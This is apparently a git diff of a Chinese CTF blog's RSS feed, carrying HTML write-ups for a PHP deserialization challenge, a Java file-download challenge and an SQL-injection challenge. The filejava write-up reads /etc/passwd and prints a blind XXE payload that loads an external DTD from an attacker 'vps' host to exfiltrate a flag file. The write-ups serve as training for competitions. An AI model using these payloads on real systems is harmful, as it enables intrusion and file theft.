+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141531496.png&#34; alt=&#34;image-20211114141531496&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Web-INF&lt;/code&gt;里面有只有一个&lt;code&gt;web.xml&lt;/code&gt;, 什么是&lt;code&gt;WEB-INF&lt;/code&gt;? 根据百度百科的介绍&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。&lt;/p&gt;
+&lt;p&gt;WEB-INF文件夹下除了web.xml外，还存一个classes文件夹，用以放置 *.class文件，这些 *.class文件是网站设计人员编写的类库，实现了jsp页面前台美工与后台服务的分离，使得网站的维护非常方便。web.xml文件为网站部署描述XML文件，对网站的部署非常重要。&lt;/p&gt;
+&lt;p&gt;Web-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有lib文件夹（用于存放需要的jar包）（用于配置，比如说用来配置过滤器等。）&lt;/p&gt;
+&lt;p&gt;/WEB-INF/src/
+　　源码目录，按照包名结构放置各个java文件。&lt;/p&gt;
+&lt;p&gt;/WEB-INF/database.properties
+　　数据库配置文件&lt;/p&gt;
+&lt;p&gt;/WEB-INF/tags/&lt;/p&gt;
+&lt;p&gt;存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&amp;lt;%@ taglibprefix=&amp;ldquo;tags&amp;rdquo; tagdir=&amp;quot;/WEB-INF /simpleTags&amp;quot; % &amp;gt;。&lt;/p&gt;
+&lt;p&gt;/WEB-INF/jsp/&lt;/p&gt;</description>
     </item>
     <item>
       <title>GACTF2020</title>
@@ -397,11 +620,53 @@ jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同
       <link>https://ch3n9w.github.io/posts/ctf-qwb2020-web-1/</link>
       <pubDate>Thu, 27 Aug 2020 20:48:12 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-qwb2020-web-1/</guid>
-      <description>half_infiltration 开局的页面如下
-&amp;lt;?php highlight_file(__FILE__); $flag=file_get_contents(&amp;#39;ssrf.php&amp;#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&amp;gt;age; $boy = $this-&amp;gt;sex; $a = $this-&amp;gt;num; $student-&amp;gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&amp;#39;flag&amp;#39;]; ob_end_clean(); } } if (isset($_GET[&amp;#39;x&amp;#39;])) { unserialize($_GET[&amp;#39;x&amp;#39;])-&amp;gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&amp;lsquo;flag&amp;rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
-启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
-ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
-&amp;lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&amp;gt;age = $a; $this-&amp;gt;sex = $b; $this-&amp;gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &amp;#34;read&amp;#34;, &amp;#34;result&amp;#34;), new User(new Pass(), &amp;#34;read&amp;#34;, &amp;#34;this&amp;#34;) ])); ?</description>
+      <description>&lt;h2 id=&#34;half_infiltration&#34;&gt;half_infiltration&lt;/h2&gt;
+&lt;p&gt;开局的页面如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;highlight_file&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$flag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ssrf.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Pass&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;ob_start&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; $result;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; $result;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $age,$sex,$num;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $student &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $boy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sex&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $student&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;$boy();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_string&lt;/span&gt;($a)) &lt;span style=&#34;color:#f92672&#34;&gt;||!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_string&lt;/span&gt;($boy)) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_object&lt;/span&gt;($student)))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;ob_end_clean&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; $$a;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $result&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$GLOBALS[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;ob_end_clean&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get_it&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路是进行两次反序列化, 第一次将$_GLOBALS[&amp;lsquo;flag&amp;rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在&lt;code&gt;ob_end_clean()&lt;/code&gt;执行之前报错退出. &lt;code&gt;ob_start&lt;/code&gt;会打开输出缓冲&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。&lt;/p&gt;</description>
     </item>
     <item>
       <title>http请求走私笔记</title>
@@ -426,15 +691,39 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
       <link>https://ch3n9w.github.io/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</link>
       <pubDate>Mon, 11 May 2020 16:11:31 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</guid>
-      <description>filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
-绝对路径
-/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
-读日志文件 logs/catalina.out
-​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
-if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xlsx&amp;#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&amp;#34;poi-ooxml-3.10 has something wrong&amp;#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
-新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
-&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ENTITY % data3 SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt; &amp;lt;!ENTITY % sp SYSTEM &amp;#34;http://vps/ext.dtd&amp;#34;&amp;gt; %sp; %param3; %exfil; ]&amp;gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
-&amp;lt;!ENTITY % param3 &amp;#34;&amp;lt;!</description>
+      <description>&lt;h2 id=&#34;filejava&#34;&gt;filejava&lt;/h2&gt;
+&lt;p&gt;提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ch3n9w.github.io/images/image-20200511193913736.png&#34; alt=&#34;image-20200511193913736&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;绝对路径&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读文件/etc/passwd&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ch3n9w.github.io/images/image-20200511194357766.png&#34; alt=&#34;image-20200511194357766&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;读日志文件 &lt;code&gt;logs/catalina.out&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;​        &lt;img loading=&#34;lazy&#34; src=&#34;https://ch3n9w.github.io/images/qBJnenyW6ts6Vglb.png__thumbnail&#34; alt=&#34;img&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xlsx&amp;#34;.equals(fileExtName))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&amp;#34;poi-ooxml-3.10 has something wrong&amp;#34;);
+            e.printStackTrace();
+          }  
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 &lt;a href=&#34;https://www.jishuwen.com/d/2inW/zh-hk&#34;&gt;https://www.jishuwen.com/d/2inW/zh-hk&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;新建一个xlsx文档, 解压, 修改&lt;code&gt;Content_Types.xml&lt;/code&gt;的内容为&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE r [
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY % data3 SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY % sp SYSTEM &amp;#34;http://vps/ext.dtd&amp;#34;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%sp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%param3;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%exfil;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在vps上的web目录下面放置一个&lt;code&gt;ext.dtd&lt;/code&gt;, 内容如下:&lt;/p&gt;</description>
     </item>
     <item>
       <title>padding_oracle 和 cbc字节反转</title>
@@ -480,18 +769,70 @@ if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xl
       <link>https://ch3n9w.github.io/posts/ctf-roarctfwp/</link>
       <pubDate>Tue, 22 Oct 2019 08:32:09 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-roarctfwp/</guid>
-      <description>web online_proxy 特征: 第一次登录后源代码内容有如下:
-换一个X-Forwarded-For 后会发现currentip是根据xff判别的
-那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
-$result = query(&amp;#34;select current_ip, last_ip from ip_log where uuid = &amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;&amp;#34;); if(count($result) &amp;gt; 0) { if($ip !== $result[0][&amp;#39;current_ip&amp;#39;]) { $last_ip = $result[0][&amp;#39;current_ip&amp;#39;]; query(&amp;#34;delete from ip_log where uuid=&amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;&amp;#34;); } else { $last_ip = $result[0][&amp;#39;last_ip&amp;#39;]; } } query(&amp;#34;insert into ip_log values (&amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;, &amp;#39;&amp;#34;.addslashes($ip).&amp;#34;&amp;#39;, &amp;#39;$last_ip&amp;#39;);&amp;#34;); die(&amp;#34;\n&amp;lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &amp;#34;.($last_ip !== &amp;#34;&amp;#34; ? &amp;#34;\nLast Ip: &amp;#34;.$last_ip : &amp;#34;&amp;#34;).&amp;#34; --&amp;gt;&amp;#34;); 解法:</description>
+      <description>&lt;h1 id=&#34;web&#34;&gt;web&lt;/h1&gt;
+&lt;h2 id=&#34;online_proxy&#34;&gt;online_proxy&lt;/h2&gt;
+&lt;p&gt;特征: 第一次登录后源代码内容有如下:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114142027467.png&#34; alt=&#34;image-20211114142027467&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;换一个&lt;strong&gt;X-Forwarded-For&lt;/strong&gt; 后会发现currentip是根据xff判别的&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114142033017.png&#34; alt=&#34;image-20211114142033017&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select current_ip, last_ip from ip_log where uuid = &amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($uuid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;($result) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($ip &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; $result[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current_ip&amp;#39;&lt;/span&gt;]) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $last_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $result[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current_ip&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;delete from ip_log where uuid=&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($uuid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $last_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $result[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;last_ip&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;insert into ip_log values (&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($uuid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;, &amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($ip)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$last_ip&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;);&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;!-- Debug Info: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; Duration: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$time&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; s &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; Current Ip: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($last_ip &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Last Ip: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$last_ip &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; 